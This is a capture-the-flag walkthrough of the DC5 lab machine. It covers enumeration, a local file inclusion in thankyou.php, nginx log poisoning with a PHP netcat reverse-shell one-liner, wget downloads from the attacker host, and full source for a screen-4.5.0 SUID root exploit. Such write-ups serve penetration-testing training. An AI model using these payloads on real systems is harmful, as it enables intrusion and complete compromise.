# DC5

## Nmap

```
sudo nmap 192.168.184.26 -p- -sS -sV

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.6.2
111/tcp   open  rpcbind 2-4 (RPC #100000)
38106/tcp open  status  1 (RPC #100024)
```

Port 80 on the target machine take us to the following web page. Multiple sub pages include non-english text and after translating random paragraphs found this is mostly gibberish.

![](<../../../.gitbook/assets/image (1268).png>)

Clicking the home button takes us to the same page but we notice this time we are on /index.php. I then ran feroxbuster against the target site to identify more pages.

```
feroxbuster --url http://192.168.184.26 -w /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -s 200,300,301 -x php 
```

![](<../../../.gitbook/assets/image (1269).png>)

Checking out contact.php and it appears to be the only page to take some form of input.

![](<../../../.gitbook/assets/image (1270).png>)

After submitting some test information we are directed to /thankyou.php where the URL contains our input from the previous page.

![](<../../../.gitbook/assets/image (1271).png>)

At this point I decided to test thankyou.php? for command injection. I caught the request in `Burpsuite` and sent it to intruder. I then set the payload variable as below.

![](<../../../.gitbook/assets/image (1273).png>)

I then added the command injection list as shown below as the payload.

```
cmd=../../../../../etc/passwd
?exec=../../../../../etc/passwd
?command=../../../../../etc/passwd
?execute../../../../../etc/passwd
?ping=../../../../../etc/passwd
?query=../../../../../etc/passwd
?jump=../../../../../etc/passwd
?code=../../../../../etc/passwd
?reg=../../../../../etc/passwd
?do=../../../../../etc/passwd
?func=../../../../../etc/passwd
?arg=../../../../../etc/passwd
?option=../../../../../etc/passwd
?load=../../../../../etc/passwd
?process=../../../../../etc/passwd
?step=../../../../../etc/passwd
?read=../../../../../etc/passwd
?function=../../../../../etc/passwd
?req=../../../../../etc/passwd
?feature=../../../../../etc/passwd
?exe=../../../../../etc/passwd
?module=../../../../../etc/passwd
?payload=../../../../../etc/passwd
?run=../../../../../etc/passwd
?print=../../../../../etc/passwd
?file=../../../../../etc/passwd
```

Ensure URL encoding is turned off as this was causing incorrect results as it was encoding `'?'`.

![](<../../../.gitbook/assets/image (1274).png>)

Viewing the results of the payload after show that the `?file=` parameter appears to be vulnerable due to the content length being greatly different form the other values.

![](<../../../.gitbook/assets/image (1275).png>)

Viewing this in the browser shows us valid results.

![](<../../../.gitbook/assets/image (1277).png>)

We can fuzz for further files using `wfuzz` and the command below:

```
wfuzz -c -w lfi.txt --hl 42 http://192.168.184.26/thankyou.php?file=../../../../../../../FUZZ
```

The LFI list can be downloaded from here

{% file src="../../../.gitbook/assets/lfi (1).txt" %}
LFI list
{% endfile %}

![](<../../../.gitbook/assets/image (1278).png>)

We have two interesting LFI paths found once `wfuzz` completes:

```
/var/log/nginx/access.log
/var/log/nginx/error.log
```

Checking out access.log we can see requests we have made.

![](<../../../.gitbook/assets/image (1279).png>)

We can capture a request in `Burpsuite` and inject a PHP reverse shell into the User-Agent field. When the code is injected into the log we are able to get a reverse shell.

![](<../../../.gitbook/assets/image (1280).png>)

Where the code snippet below is used for the RCE:

```
<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.211 80 >/tmp/f') ?>
```

With a netcat listener listening we can then access the log files again at: [http://192.168.211.26/thankyou.php?file=../../../../../../../var/log/nginx/access.log](http://192.168.211.26/thankyou.php?file=../../../../../../../var/log/nginx/access.log)

When we attempt to load the log files the page should hang and we get a reverse shell.

![](<../../../.gitbook/assets/image (1281) (1).png>)

Searching for SUID commands on the machine find the binary screen-4.5.0 has the SUID bit set.

```
find / -perm -u=s -type f 2>/dev/null 
```

![](<../../../.gitbook/assets/image (1283).png>)

Researching on Google shows a local privilege escalation exploit for this binary version.

{% embed url="https://github.com/XiphosResearch/exploits/tree/master/screen2root" %}

We first need to create some files and break down the script to get this to work. Follow the instructions below to achieve shell.

{% tabs %}
{% tab title="libhax.c" %}
```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```
{% endtab %}
{% endtabs %}

**Compile libhax.c**

`gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c`

{% tabs %}
{% tab title="rootshell.c" %}
```
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```
{% endtab %}
{% endtabs %}

**Compile rootshell.c**

`gcc -o /tmp/rootshell /tmp/rootshell.c`\*\* \*\*

Create exploit bash script.

{% tabs %}
{% tab title="exploit.sh" %}
```
#!/bin/bash

cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
echo "[+] Triggering..."
screen -ls 
```
{% endtab %}
{% endtabs %}

Upload compiled files to target machine.

```
wget http://192.168.49.211/rootshell
wget http://192.168.49.211/libhax.so
wget http://192.168.49.211/exploit.sh
```

Once uploaded make the bash script executable:

```
chmod +x exploit.sh
```

Execute exploit.sh then after run `/tmp/rootshell` to gain shell as root.

![](<../../../.gitbook/assets/image (1282).png>)
